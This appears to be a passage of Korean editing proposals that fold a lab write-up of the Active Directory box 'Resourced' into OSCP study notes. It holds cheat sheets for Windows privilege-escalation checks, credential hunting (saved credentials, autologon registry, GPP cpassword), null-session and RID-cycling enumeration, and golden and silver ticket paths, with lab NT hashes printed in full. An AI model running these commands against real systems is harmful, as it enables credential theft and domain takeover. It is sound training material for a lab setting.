**② 병합** (`C-2. 셸 직후`). ⚠️ **이미 같은 내용이 있을 가능성이 높다. 중복이면 이 제안은 버릴 것.**

**③ 넣을 본문**

```markdown
**리눅스 반사신경은 Windows 에서 전부 무용지물임** — `sudo -l`·`find / -perm -4000`·`getcap -r /`·`crontab -l` 이 없음.

| 리눅스 | Windows 대응 | 무엇을 찾는가 |
|---|---|---|
| `id` | `whoami /all` | SID · 그룹 · 특권을 한 번에 |
| `sudo -l` | `whoami /priv` | `SeImpersonate`·`SeBackup`·`SeRestore`·`SeDebug`·`SeTakeOwnership` |
| `find / -perm -4000` | `icacls "C:\Program Files\*"` · 서비스 바이너리 권한 | 쓰기 가능한 서비스 실행 파일 |
| `crontab -l` | `schtasks /query /fo LIST /v` | 예약 작업 |
| `netstat -tulpn` | `netstat -ano` | 로컬에만 열린 포트(포워딩 대상) |
| `env` | `Get-ChildItem Env:` | 자격증명이 박힌 환경변수 |
| — | `Get-ChildItem C:\Users -Force` · `cmdkey /list` · `reg query …\Winlogon` | 다른 프로필 · 저장 자격증명 · 자동 로그인 평문 |

**AD DC 에서 추가로**: `net group "Backup Operators" /domain` — 멤버였다면 `SeBackupPrivilege` 로 하이브를 직접 뜰 수 있음([[Vault]] 경로).

⚠️ [[Resourced]] 는 evil-winrm 셸을 잡고 **`type ../desktop/local.txt` 한 줄만 치고 나왔음.** 결과적으로 BloodHound 가 답을 줘 손해가 없었으나, 그 셸에서 무엇이 나왔을지는 **확인하지 않았으므로 `[가정]`** 임.
```

**④ 지우기 전 원문** — 구 §6-10 전문(`_backup\Resourced.md.bak` 1321–1359행). 핵심:

> ### 6-10. 셸을 잡고도 로컬 열거를 하지 않았다
> §4-2에서 `L.Livingstone` 으로 evil-winrm 셸을 얻은 뒤, 노트에 남은 명령은 **`type ../desktop/local.txt` 하나뿐**이다. 플래그를 읽고 곧바로 나왔다.
> 결과적으로는 BloodHound가 답을 줬으니 손해가 없었지만, **셸을 잡으면 반사적으로 쳐야 하는 것들을 건너뛴 것**은 사실이다. 그 셸에서 다음이 나왔을 수도 있다 — 확인하지 않았으므로 [가정] 이다.
> > **`whoami /priv` 는 Windows 박스의 «`sudo -l`»** 이다. [[Squid]]가 그 교훈이고, 이 박스에서는 치지 않았다.

---

## 제안 10 — `A-1` **병합** (안 쓴 열거 채널)

**② 병합** (`A-1-30` 또는 `C-1. 정찰 직후`. 단독 기록자가 위치를 정할 것)

**③ 넣을 본문**

```markdown
**먼저 통한 채널이 있어도 3분짜리 광역 열거는 병렬로 돌려 둘 것.** [[Resourced]] 는 익명 SMB 가 곧바로 통해 다른 채널을 아예 던지지 않았음. 결과적으로 필요 없었으나 막혔다면 여기서 시작했어야 함:

| 안 쓴 것 | 언제 필요한가 | 명령 |
|---|---|---|
| `rpcclient` 널 세션 | `nxc --users` 가 막혔을 때. SAMR 이 막혀도 LSARPC 는 열린 경우가 있음 | `rpcclient -U '' -N <IP> -c 'enumdomusers;querydominfo'` |
| RID 사이클링 | 위 둘이 다 막혔을 때 | `impacket-lookupsid '<domain>/guest'@<IP> -no-pass 20000` |
| 익명 LDAP | SMB 쪽이 막혔을 때([[Hutch]] 가 그 경우) | `ldapsearch -x -H ldap://<IP> -s base namingcontexts` |
| `--pass-pol` | 스프레이 «전에» 항상 | `nxc smb <IP> -u U -p P --pass-pol` |
| `SYSVOL` 의 GPP `cpassword` | 항상 | `nxc smb <IP> -u U -p P -M gpp_password -M gpp_autologin` |
| `enum4linux-ng -A` | 위 전부를 한 번에 | `enum4linux-ng -A <IP>` |

⚠️ [[Resourced]] 는 `smbclient '//IP/SYSVOL'`·`'//IP/IPC$'` 를 열어보긴 했으나(history 1386–1387) **`cpassword` 검색은 하지 않았음.** 그리고 `enum4linux-ng` 는 같은 세션의 [[Vault]] 작업에서는 썼는데(history 1699행) 이 박스에서는 안 썼음 — **도구 선택이 「가진 것」이 아니라 「먼저 통한 것」에 좌우된 사례임.**
```

**④ 지우기 전 원문** — 구 §6-12 전문(`_backup\Resourced.md.bak` 1380–1396행). 위 표가 그 원문 그대로이고, 마지막 두 문단도 원문 그대로다.

---

## 제안 11 — `D` **병합** (시간 배분)

**② 병합** (`D. 시간 배분 · 손절 기준`)

**③ 넣을 본문**

```markdown
**[[Resourced]] — Intermediate AD 단일 DC (2026-07-03 · 07-06 두 세션)**

| 구간 | 실제 | 적정 | 손절 기준 |
|---|---|---|---|
| nmap `-p-` | 2분 11초(09:13:33→09:15:45) | 2분 | — |
| 익명 열거 → description 발견 | 09:15→10:19 | 5분 | `nxc --users` 가 되면 설명 열을 즉시 grep |
| 공유 열거 → `Password Audit` 회수 | 10:42→13:21 (2시간 39분, 다른 작업 포함) | 20분 | `smbclient` 인용 지옥이 여기. `-U 'user%pass'` 한 형식만 쓰면 5분 |
| 오프라인 secretsdump | 13:46→13:48 | 5분 | 실패하면 하이브가 아니라 **명령 문법**을 먼저 의심 |
| 해시 검증 → WinRM | 13:52→14:26 (34분) | 10분 | 래퍼 오류 구간. `-h` 확인이 30초 |
| BloodHound → RBCD → SYSTEM | 07-06 09:16→10:51 | 40분 | RBCD 3단은 명령 3개. 막히면 대개 «시계» 아니면 «이름 해석» |

**시간 서사의 근거** — `~/PG/Resourced/` 파일 mtime + `파일보관` 스크린샷 파일명(`Pasted image <YYYYMMDDHHMMSS>.png`). 히스토리 줄 순서는 근거로 쓰지 않았음(A-6-?? 참조).
```

**④ 지우기 전 원문** — 구 §6-8 타임라인 표 + §7-3 시간 배분 표. 전문은 `_backup\Resourced.md.bak` 1253–1281행 · 1460–1477행. 구 §7-3 원문:

> | 구간 | 실제 | 적정 | 손절 기준 |
> |---|---|---|---|
> | nmap `-p-` | ~2분 | 2분 | — |
> | 익명 열거 → description 발견 | 몇 분 | 5분 | `nxc --users` 가 되면 설명 열을 즉시 grep. 안 되면 다른 초기 침투를 찾아라 |
> | 공유 열거 → `Password Audit` 회수 | ~2.5시간(10:42→13:21, 다른 작업 포함) | 20분 | §6-2의 인용 지옥이 여기다. `-U 'user%pass'` 한 형식만 쓰면 5분 |
> | 오프라인 secretsdump | 수 분 | 5분 | 실패하면 하이브가 아니라 명령 문법을 먼저 의심 |
> | 해시 검증 → WinRM | ~40분(13:52→14:26) | 10분 | §6-1의 래퍼 오류. `-h` 로 인터페이스 확인이 30초 |
> | BloodHound → RBCD → SYSTEM | 3일 뒤 세션(다른 박스와 병행) | 40분 | RBCD 3단은 명령 3개다. 막히면 대개 «시계» 아니면 «이름 해석» — 다른 데를 파지 마라 |

⚠️ 구 §6-8 의 「BloodHound 를 3시간 50분 늦게 돌렸다」는 이미 `B-53` 에 있으므로 **중복 이관하지 않는다.**

---

## 제안 12 — `B-5` **병합** (하지 않은 경로 — 정직한 미실행 기록)

**② 병합** (`B-54` 말미 또는 `B-56`. 단독 기록자가 정할 것)

**③ 넣을 본문**

```markdown
**같은 재료로 갈 수 있었던 «더 짧은» 경로들** — [[Resourced]] 는 전부 실행하지 않았음(관측 없음):
- **골든 티켓** — `krbtgt` NT해시(`3004b16f88664fbebfcb9ed272b0565b`)를 오프라인 덤프에서 이미 확보했음. `impacket-ticketer` 면 RBCD 없이 곧바로 도메인 관리자였음. `[가정]` 통했을 것으로 보나 확인하지 않았음. 다만 탐지 관점에서 시끄럽고 「권한 획득」이 아니라 「위조」라 학습 가치가 다름
- **실버 티켓** — `$MACHINE.ACC` / `RESOURCEDC$` NT해시(`9ddb6f4d9d01fedeb4bccfb09df1b39d`)로 가능했음
- **Shadow Credentials** — `GenericAll` 이면 `msDS-KeyCredentialLink` 도 쓸 수 있으나 **이 도메인에 ADCS 가 없어** PKINIT 경로가 성립하지 않음

→ **도메인 전체 해시를 얻은 시점에서 「경로가 하나뿐」인 경우는 거의 없다.** 가장 조용한 것과 가장 짧은 것을 갈라 고를 것.
```

**④ 지우기 전 원문** — 구 §6-13 전문(`_backup\Resourced.md.bak` 1398–1405행). 두 번째 항목(`Administrator` 해시 실패)은 **제안 6** 으로 갔다.

---

## 제안 13 — `E` **병합 없음 · 폐기 판단**

구 §7-1(도구 적법성 표) · §7-4(자동 도구 없이 같은 결과를 얻는 법)는 **`E. OSCP 시험 규정` 과 각 기법 카드에 이미 있는 내용의 재진술**이라 판단해 이관하지 않았다. 다만 아래 한 줄만 `E` 에 보강할 값이 있다:

```markdown
`rdate`·`bloodhound-python`·`impacket-*`·`evil-winrm`·`nxc` 는 **전부 허용**임. 금지 대상은 *"automatically discovering and exploiting vulnerabilities … without effort or enumeration"* 인 도구이며 열거·인증·프로토콜 클라이언트는 해당하지 않음.
```

**④ 지우기 전 원문** — `_backup\Resourced.md.bak` 1411–1426행 · 1479–1488행.

---

## 이관하지 «않은» 것 — 근거

| 구 절 | 처리 |
|---|---|
| §0 배우는 것 6항목 | **전부 기존 카드에 이미 있음** — B-51(description)·B-52(PASSWORD_EXPIRED)·B-53(BloodHound)·B-54(컴퓨터 객체 ACE)·A-51(Kerberos 함정 셋). 중복 이관하지 않음 |
| §0 시험 출제 가능성 표 · [[Hutch]] 짝 서술 | 박스 노트 `## 관련` 의 [[Hutch]] 링크와 그 설명으로 축약해 남김 |
| §1-1 nmap 플래그 해설 표 · DC 포트 지문 tip | 박스 노트 `Service Enumeration` 에 산문으로 남김(재현·납득에 필요) |
| §2-8 NTLM/Kerberos 프로토콜 다이어그램 전문 | **배경 이론 강의**로 판단해 삭제. PtH 가 성립하는 이유(NTOWFv2 식 2줄)와 「서명은 릴레이를 막지 PtH 를 막지 않는다」만 박스 노트에 남김 |
| §5 플래그 표 | `Local.txt value:` / `Proof.txt value:` 블록으로 분산 |
| §6-9 재현 최소 경로 12줄 | 각 finding 의 `Steps to reproduce the attack:` 로 흡수. **원문이 스스로 「실행 기록이 아니라 재구성」이라 밝힌 블록**이라 코드펜스로는 남기지 않음 |
| §6-11 적대적 검증 정정 이력 표 | `_WRITEUP-STANDARD` §4 규율대로 **본문에서 제거**. `_AUDIT` 와 git 이력이 그 역할을 함 |
| §8 방어 관점 8행 표 | 각 finding 의 `Vulnerability Fix:` 로 분산. 탐지 이벤트(4741·4742·4769·5145)는 `Privilege Escalation` 의 Fix 로 |
